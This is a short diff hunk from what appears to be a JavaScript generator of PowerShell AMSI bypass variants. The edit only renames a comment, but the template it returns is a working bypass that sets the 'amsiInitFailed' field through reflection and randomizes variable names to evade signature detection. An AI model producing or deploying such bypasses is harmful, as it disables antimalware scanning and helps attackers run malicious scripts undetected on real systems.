@@ -126,7 +126,7 @@
       const var1 = getRandomVarName();
       const var2 = getRandomVarName();
 
-      return `# Dynamic Reflection Variant Works Only in Defender
+      return `# Reflection Method Variant Works Only in Defender
 $${var1} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 $${var2} = $${var1}.GetField('amsiInitFailed','NonPublic,Static')
 $${var2}.SetValue([object]$null,$true)`;
